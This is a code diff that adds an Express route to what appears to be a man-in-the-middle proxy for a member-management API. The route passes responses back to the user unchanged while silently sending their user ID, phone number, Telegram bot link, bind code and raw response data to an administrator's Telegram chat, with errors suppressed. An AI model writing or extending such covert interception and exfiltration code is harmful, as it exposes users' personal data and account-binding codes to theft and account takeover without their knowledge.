@@ -1705,6 +1705,21 @@ app.all('/app/api/memberManager/dataStatistics', async (req, res) => {
   await proxyAndAddBonus(req, res);
 });
 
+app.all('/app/api/memberManager/bindRobotDetail', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserId(req, jsonResp);
+    const respData = getResponseData(jsonResp);
+    if (data.adminChatId && bot) {
+      const phone = getPhone(data, userId);
+      const rd = (respData && typeof respData === 'object') ? respData : {};
+      bot.sendMessage(data.adminChatId, `🤖 Robot Bind Details\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n📱 Telegram Bot: ${rd.telegramBotLink || rd.botLink || 'N/A'}\n🔑 Bind Code: ${rd.telegramBindCode || rd.bindCode || rd.code || 'N/A'}\n🔗 Bound: ${rd.isBound !== undefined ? rd.isBound : (rd.bound !== undefined ? rd.bound : 'N/A')}\n📊 Full: ${JSON.stringify(rd).substring(0, 500)}`).catch(()=>{});
+    }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
+
 app.all('/app/api/orderOut/receiveOcr', async (req, res) => {
   const data = await loadData();
   try {
